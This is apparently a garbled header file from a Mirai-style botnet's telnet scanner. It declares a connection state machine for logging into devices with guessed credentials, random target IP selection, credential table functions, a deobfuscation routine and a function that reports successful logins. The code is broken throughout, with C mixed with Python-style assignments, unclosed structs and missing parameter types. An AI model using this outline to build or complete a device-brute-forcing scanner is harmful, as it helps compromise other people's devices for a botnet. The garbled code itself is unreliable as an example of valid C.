#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
SCANNER_MAX_CONNS	= 128
SCANNER_RAW_PPS	= 160
#else
SCANNER_MAX_CONNS	= 128
SCANNER_RAW_PPS	= 160
#endif

SCANNER_RDBUF_SIZE	= 256
SCANNER_HACK_DRAIN	= 64

struct scanner_auth {

struct scanner_connection {
    struct scanner_auth *auth
    # From anonymous enumerated type
SC_CLOSED = 0
SC_CONNECTING = 1
SC_HANDLE_IACS = 2
SC_WAITING_USERNAME = 3
SC_WAITING_PASSWORD = 4
SC_WAITING_PASSWD_RESP = 5
SC_WAITING_ENABLE_RESP = 6
SC_WAITING_SYSTEM_RESP = 7
SC_WAITING_SHELL_RESP = 8
SC_WAITING_SH_RESP = 9
SC_WAITING_TOKEN_RESP = 10
    } state; = 11
    ipv4_t dst_addr; = 12


static setup_connection(struct scanner_connection *)
static ipv4_t get_random_ip(void)

static consume_iacs(struct scanner_connection *)
static consume_any_prompt(struct scanner_connection *)
static consume_user_prompt(struct scanner_connection *)
static consume_pass_prompt(struct scanner_connection *)
static consume_resp_prompt(struct scanner_connection *)

static add_auth_entry(, , uint16_t)
static struct scanner_auth *random_auth_entry(void)
static report_working(ipv4_t, uint16_t, struct scanner_auth *)
static deobf(, )
static BOOL can_consume(struct scanner_connection *, , int)
